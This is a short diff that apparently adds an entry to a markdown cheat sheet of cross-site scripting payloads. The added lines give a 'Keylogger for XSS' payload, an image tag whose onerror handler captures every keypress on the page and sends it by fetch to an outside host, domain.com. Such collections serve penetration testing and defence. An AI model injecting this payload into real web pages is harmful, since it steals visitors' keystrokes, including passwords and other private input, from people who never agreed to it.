@@ -18,6 +18,11 @@ fclose($fp);
 ?>
 ```
 
+Keylogger for XSS
+```
+<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+```
+
 ## XSS in HTML/Applications
 XSS Basic
 ```
